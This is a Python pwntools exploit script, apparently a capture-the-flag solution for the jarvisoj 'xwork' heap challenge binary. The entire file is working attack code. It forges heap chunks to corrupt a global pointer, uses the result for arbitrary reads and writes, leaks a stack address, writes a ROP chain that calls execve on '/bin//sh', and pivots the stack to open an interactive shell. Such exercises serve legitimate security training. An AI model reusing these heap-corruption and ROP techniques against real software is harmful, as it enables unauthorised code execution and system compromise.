from pwn import *
p=process('./data/bin/heap23_32_jarvisoj_xwork')
context.log_level='debug'
context.terminal = ['tmux', 'splitw', '-h']
stack_p=0x6CCD98
string=0x6CCC60
prdi=0x4018a6
prsi=0x4019c7
pradx=0x4789a6
prbp=0x4004d1
leave=0x400C70
syscall=0x47CD3D
g_pointer = 0x6CCD60

def ru(x):
    p.recvuntil(x)

def se(x):
    p.sendline(x)

def add_order(data):
    se('1')
    sleep(0.1)
    p.send(data)
    ru('Exit')

def delete_order(idx):
    se('4')
    ru('index')
    se(str(idx))
    ru('Exit')

def edit_order(idx,order,wait=True):
    se('3')
    ru('index')
    se(str(idx))
    sleep(0.1)
    p.send(order)
    if wait:
        ru('Exit')

def show_order(idx):
    se('2')
    ru('index:')
    se(str(idx))
    sleep(0.1)
    data=p.recv(31)
    ru('Exit')
    return data

def leak(addr):
    edit_order(0,p64(addr))
    data=show_order(1)
    return data

ru(b'your name:');p.send(b'1'*(31-8)+p64(0x31));ru(b'Exit')
add_order(p64(0)+p64(0x51)+p64(g_pointer-0x8*3)+p64(g_pointer-0x8*2)[:-1])
add_order(b'1'*25);add_order(b't3');add_order(b't4');add_order(b't5')
delete_order(1)
delete_order(2)
data=show_order(2);h1=u32(data[:4])
edit_order(2,p64(h1+0x20))
add_order(b'a')
add_order(p64(0x50)+p64(0x90))
delete_order(2)
edit_order(0,p64(0)+p64(0x6cbb80)+p64(0)+p64(g_pointer)[:-1])
edit_order(0,p64(0x6CCD68));stack=u64(leak(0x6cc638)[8:16])-0x170
buf=p64(string+0x8)+b'/bin//sh';edit_order(0,p64(string));edit_order(1,buf)
payload1=p64(prdi)+p64(string+0x8)+p64(prsi);edit_order(0,p64(stack_p));edit_order(1,payload1)
payload2=p64(0)+p64(pradx)+p64(0x3b);edit_order(0,p64(stack_p+0x18));edit_order(1,payload2)
payload3=p64(0x0)+b'/bin//sh'+p64(syscall);edit_order(0,p64(stack_p+0x30));edit_order(1,payload3)
pivot=p64(prbp)+p64(stack_p-0x8)+p64(leave);edit_order(0,p64(stack));edit_order(1,pivot,False)
p.interactive()